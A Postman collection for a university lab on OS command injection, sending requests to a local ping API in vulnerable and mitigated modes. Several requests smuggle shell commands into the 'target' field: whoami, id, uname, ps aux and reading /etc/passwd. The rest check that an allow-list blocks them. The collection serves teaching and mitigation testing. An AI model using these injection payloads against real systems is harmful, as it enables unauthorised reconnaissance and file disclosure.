@@ -1,0 +1,274 @@
+{
+	"info": {
+		"_postman_id": "c3e9821a-4d20-4a88-b2e1-7d12f939e001",
+		"name": "OS Command Injection Lab (IT-30001)",
+		"description": "IIITA IT-30001 Cyber Security Lab - OS Command Injection Exploits and Mitigations",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "1. Vulnerable - Benign Request",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n  \"target\": \"127.0.0.1\",\n  \"mode\": \"vulnerable\"\n}"
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/api/ping",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"api",
+						"ping"
+					]
+				},
+				"description": "Normal diagnostic request without injection"
+			},
+			"response": []
+		},
+		{
+			"name": "2. Vulnerable - Exploit whoami",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n  \"target\": \"127.0.0.1; whoami\",\n  \"mode\": \"vulnerable\"\n}"
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/api/ping",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"api",
+						"ping"
+					]
+				},
+				"description": "In-band command injection returning current OS user"
+			},
+			"response": []
+		},
+		{
+			"name": "3. Vulnerable - Exploit id & uname -a",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n  \"target\": \"127.0.0.1; id; uname -a\",\n  \"mode\": \"vulnerable\"\n}"
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/api/ping",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"api",
+						"ping"
+					]
+				},
+				"description": "Reconnaissance returning user IDs, group permissions, and Linux kernel release"
+			},
+			"response": []
+		},
+		{
+			"name": "4. Vulnerable - Exploit cat passwd",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n  \"target\": \"127.0.0.1; cat /etc/passwd | head -5\",\n  \"mode\": \"vulnerable\"\n}"
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/api/ping",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"api",
+						"ping"
+					]
+				},
+				"description": "Arbitrary file disclosure dumping system users"
+			},
+			"response": []
+		},
+		{
+			"name": "5. Vulnerable - Exploit ps aux",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n  \"target\": \"127.0.0.1 && ps aux | head -6\",\n  \"mode\": \"vulnerable\"\n}"
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/api/ping",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"api",
+						"ping"
+					]
+				},
+				"description": "Process listing enumeration using && operator"
+			},
+			"response": []
+		},
+		{
+			"name": "6. Mitigated - Blocked Exploit whoami",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n  \"target\": \"127.0.0.1; whoami\",\n  \"mode\": \"mitigated\"\n}"
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/api/ping",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"api",
+						"ping"
+					]
+				},
+				"description": "Verifying that the allow-list regex blocks the exploit (HTTP 400)"
+			},
+			"response": []
+		},
+		{
+			"name": "7. Mitigated - Blocked Exploit id & uname",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n  \"target\": \"127.0.0.1; id; uname -a\",\n  \"mode\": \"mitigated\"\n}"
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/api/ping",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"api",
+						"ping"
+					]
+				},
+				"description": "Verifying that reconnaissance payloads are blocked"
+			},
+			"response": []
+		},
+		{
+			"name": "8. Mitigated - Legitimate Ping Allowed",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n  \"target\": \"127.0.0.1\",\n  \"mode\": \"mitigated\"\n}"
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/api/ping",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"api",
+						"ping"
+					]
+				},
+				"description": "Verifying that legitimate ping requests succeed under mitigation"
+			},
+			"response": []
+		}
+	]
+}
